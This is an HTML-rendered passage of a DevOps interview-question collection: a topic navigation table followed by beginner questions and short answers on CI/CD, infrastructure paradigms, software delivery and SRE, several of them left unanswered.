    &lt;td align="center"&gt;&lt;a href="#docker"&gt;&lt;img src="images/docker.png" width="70px;" height="75px;" alt="Docker" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Docker&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#docker-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#docker-advanced"&gt;Advanced &lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td align="center"&gt;&lt;a href="#coding"&gt;&lt;img src="images/coding.png" width="75px;" height="75px;" alt="coding" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Coding&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#coding-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#coding-advanced"&gt;Advanced &lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#python"&gt;&lt;img src="images/python.png" width="80px;" height="75px;" alt="Python" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Python&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#python-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#python-advanced"&gt;Advanced &lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#go"&gt;&lt;b&gt;Go&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#go-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#shell-scripting"&gt;&lt;img src="images/bash.png" width="70px;" height="75px;" alt="Bash" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Shell Scripting&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#shell-scripting-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#shell-scripting-advanced"&gt;Advanced &lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#kubernetes"&gt;&lt;img src="images/kubernetes.png" width="75px;" height="75px;" alt="kubernetes" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Kubernetes&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#kubernetes-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#prometheus"&gt;&lt;img src="images/prometheus.png" width="75px;" height="75px;" alt="Prometheus" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Prometheus&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#prometheus-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#prometheus-advanced"&gt;Advanced &lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#mongo"&gt;&lt;img src="images/mongo.png" width="75px;" height="75px;" alt="Mongo" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Mongo&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#mongo-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#sql"&gt;&lt;img src="images/sql.png" width="75px;" height="75px;" alt="sql" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;SQL&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#sql-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#sql-advanced"&gt;Advanced &lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td align="center"&gt;&lt;a href="#cloud"&gt;&lt;img src="images/cloud.png" width="110px;" height="75px;" alt="Cloud" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Cloud&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#cloud-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#aws"&gt;&lt;b&gt;AWS&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#aws-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#azure"&gt;&lt;b&gt;Azure&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#azure-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#gcp"&gt;&lt;b&gt;Google Cloud Platform&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#gcp-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#openstack"&gt;&lt;img src="images/openstack.png" width="75px;" height="75px;" alt="openstack" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;OpenStack&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#openstack-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#openstack-advanced"&gt;Advanced &lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#security"&gt;&lt;img src="images/security.png" width="75px;" height="75px;" alt="security" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Security&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#security-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#security-advanced"&gt;Advanced &lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#puppet"&gt;&lt;img src="images/puppet.png" width="75px;" height="75px;" alt="puppet" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Puppet&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#puppet-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#puppet-advanced"&gt;Advanced &lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#openshift"&gt;&lt;img src="images/openshift.png" width="75px;" height="75px;" alt="OpenShift" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;OpenShift&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#openshift-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;/sub&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td align="center"&gt;&lt;a href="#monitoring"&gt;&lt;img src="images/monitoring.png" width="75px;" height="75px;" alt="Monitoring" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Monitoring&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#monitoring-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#elastic"&gt;&lt;img src="images/elastic.png" width="110px;" height="75px;" alt="Elastic" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Elastic&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#elastic-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#virtualization"&gt;&lt;b&gt;Virtualization&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#virtualization-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#dns"&gt;&lt;b&gt;DNS&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#dns-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#operating-system"&gt;&lt;b&gt;Operating System&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#operating-system-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#distributed"&gt;&lt;img src="images/distributed.png" width="110px;" height="75px;" alt="Distributed" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Distributed&lt;/b&gt;&lt;/a&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#general"&gt;&lt;b&gt;General&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#general-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#HR"&gt;&lt;img src="images/HR.png" width="110px;" height="75px;" alt="HR" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;HR&lt;/b&gt;&lt;/a&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td align="center"&gt;&lt;a href="#testing"&gt;&lt;img src="images/testing.png" width="75px;" height="75px;" alt="Testing" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Testing&lt;/b&gt;&lt;/a&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#databases"&gt;&lt;img src="images/databases.png" width="75px;" height="75px;" alt="Databases" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Databases&lt;/b&gt;&lt;/a&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#design"&gt;&lt;img src="images/design.png" width="110px;" height="75px;" alt="Design" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Design&lt;/b&gt;&lt;/a&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#questions-you-ask"&gt;&lt;img src="images/you.png" width="110px;" height="75px;" alt="you" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Questions you ask&lt;/b&gt;&lt;/a&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#exercises"&gt;&lt;img src="images/exercises.png" width="110px;" height="75px;" alt="Exercises" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Exercises&lt;/b&gt;&lt;/a&gt;&lt;/td&gt;
  &lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;




&lt;h2&gt;&lt;a id="user-content-devops" class="anchor" aria-hidden="true" href="#devops"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;DevOps&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-devops-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner" class="anchor" aria-hidden="true" href="#baby-beginner"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is DevOps?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Amazon:&lt;/p&gt;
&lt;p&gt;"DevOps is the combination of cultural philosophies, practices, and tools that increases an organization’s ability to deliver applications and services at high velocity: evolving and improving products at a faster pace than organizations using traditional software development and infrastructure management processes. This speed enables organizations to better serve their customers and compete more effectively in the market."&lt;/p&gt;
&lt;p&gt;Microsoft:&lt;/p&gt;
&lt;p&gt;"DevOps is the union of people, process, and products to enable continuous delivery of value to our end users. The contraction of “Dev” and “Ops” refers to replacing siloed Development and Operations to create multidisciplinary teams that now work together with shared and efficient practices and tools. Essential DevOps practices include agile planning, continuous integration, continuous delivery, and monitoring of applications."&lt;/p&gt;
&lt;p&gt;Red Hat:&lt;/p&gt;
&lt;p&gt;"DevOps describes approaches to speeding up the processes by which an idea (like a new software feature, a request for enhancement, or a bug fix) goes from development to deployment in a production environment where it can provide value to the user. These approaches require that development teams and operations teams communicate frequently and approach their work with empathy for their teammates. Scalability and flexible provisioning are also necessary. With DevOps, those that need power the most, get it—through self service and automation. Developers, usually coding in a standard development environment, work closely with IT operations to speed software builds, tests, and releases—without sacrificing reliability."&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What are the benefits of DevOps? What it can help us to achieve?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;You should mention some or all of the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Collaboration&lt;/li&gt;
&lt;li&gt;Improved delivery&lt;/li&gt;
&lt;li&gt;Security&lt;/li&gt;
&lt;li&gt;Speed&lt;/li&gt;
&lt;li&gt;Scale&lt;/li&gt;
&lt;li&gt;Reliability&lt;/li&gt;
&lt;/ul&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Make sure to elaborate :)
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What are the anti-patterns of DevOps?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Not allowing to push in production on Friday :)&lt;/li&gt;
&lt;li&gt;One specific person is in charge of different tasks. For example there is only one person who is allowed to merge the code of everyone else&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Treating production differently from development environment. For example, not implementing security in development environment
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What is Continuous Integration?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;A development practice where developers integrate code into a shared repository frequently. It can range from a couple of changes every day or a week to a couple of changes in one hour in larger scales.&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Each piece of code (change/patch) is verified, to make the change is safe to merge. Today, it's a common practice to test the change using an automated build that makes sure the code can integrated. It can be one build which runs several tests in different levels (unit, functional, etc.) or several separate builds that all or some has to pass in order for the change to be merged into the repository.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is Continuous Deployment?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is Continuous Delivery?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What CI/CD best practices are you familiar with? Or what do you consider as CI/CD best practice?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What systems and/or tools are you using for the following?:
&lt;ul&gt;
&lt;li&gt;CI/CD&lt;/li&gt;
&lt;li&gt;Provisioning infrastructure&lt;/li&gt;
&lt;li&gt;Configuration Management&lt;/li&gt;
&lt;li&gt;Monitoring &amp;amp; alerting&lt;/li&gt;
&lt;li&gt;Logging&lt;/li&gt;
&lt;li&gt;Code review&lt;/li&gt;
&lt;li&gt;Code coverage&lt;/li&gt;
&lt;li&gt;Tests&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;li&gt;CI/CD - Jenkins, Circle CI, Travis&lt;/li&gt;
&lt;li&gt;Provisioning infrastructure - Terraform, CloudFormation&lt;/li&gt;
&lt;li&gt;Configuration Management - Ansible, Puppet, Chef&lt;/li&gt;
&lt;li&gt;Monitoring &amp;amp; alerting - Prometheus, Nagios&lt;/li&gt;
&lt;li&gt;Logging - Logstash, Graylog, Fluentd&lt;/li&gt;
&lt;li&gt;Code review - Gerrit, Review Board&lt;/li&gt;
&lt;li&gt;Code coverage - Cobertura, Clover, JaCoCo&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Tests - Robot, Serenity, Gauge
&lt;/b&gt;&lt;/li&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What are you taking into consideration when choosing a tool/technology?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;In your answer you can mention one or more of the following:&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;mature vs. cutting edge&lt;/li&gt;
&lt;li&gt;community size&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;architecture aspects - agent vs. agentless, master vs. masterless, etc.
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;Explain mutable vs. immutable infrastructure&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;In mutable infrastructure paradigm, changes are applied on top of the existing infrastructure and over time
the infrastructure builds up a history of changes. Ansible, Puppet and Chef are examples to tools which
follow mutable infrastructure paradigm.&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;In immutable infrastructure paradigm, every change is actually new infrastructure. So a change
to a server will result in a new server instead of updating it. Terraform is an example of technology
which follows the immutable infrastructure paradigm.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What ways are you familiar with to deliver a software? What are the advantages and disadvantages of each method?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Archive - collect all your app files into one archive (e.g. tar) and deliver it to the user.&lt;/li&gt;
&lt;li&gt;Package - depends on the OS, you can use your OS package format (e.g. in RHEL/Fefodra it's RPM) to deliver your software with a way to install, uninstall and update it using the standard packager commands&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Images - Either VM or container images where your package is included with everything it needs in order to run successfully.
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What is caching? How it works? Why is it important?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain stateless vs. stateful&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Stateless applications don't store any data in the host which makes it ideal for horizontal scaling and microservices.
Stateful applications depend on the storage to save state and data, typically databases are stateful applications.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Describe the workflow of setting up some type of web server (Apache, IIS, Tomact, ...)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain "Open Source"&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Describe me the architecture of service/app/project/... you designed and/or implemented&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What types of tests are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Styling, unit, functional, API, integration, smoke, scenario, ...&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;You should be able to explain those that you mention.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;You need to install periodically the same package on different operating systems (Ubuntu, RHEL, ...). How would you do it?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;It can be as simple as one Ansible (or other CM tool) task that runs periodically with Cron. In more advanced cases, perhaps a CI system.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h5&gt;&lt;a id="user-content-sre" class="anchor" aria-hidden="true" href="#sre"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SRE&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;Compare SRE to DevOps&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is Reliability? How does it fit DevOps?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Reliability, when used in DevOps context, is the ability of a system to recover from infrastructure failure or disruption. Part of it is also being able to scale based on your organization or team demands.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
